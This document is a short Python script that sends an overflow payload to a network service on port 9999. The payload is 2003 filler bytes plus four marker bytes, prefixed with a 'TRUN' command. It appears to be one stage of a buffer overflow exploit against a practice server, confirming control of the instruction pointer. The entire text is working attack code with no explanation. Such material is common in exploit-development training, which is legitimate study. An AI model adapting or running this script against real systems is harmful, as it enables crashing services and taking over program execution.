#!/usr/bin/python
import sys, socket
shellcode = "A" * 2003 + "B" * 4
try:
	payload = "TRUN /.:/" + shellcode
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.137.189',9999))
	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
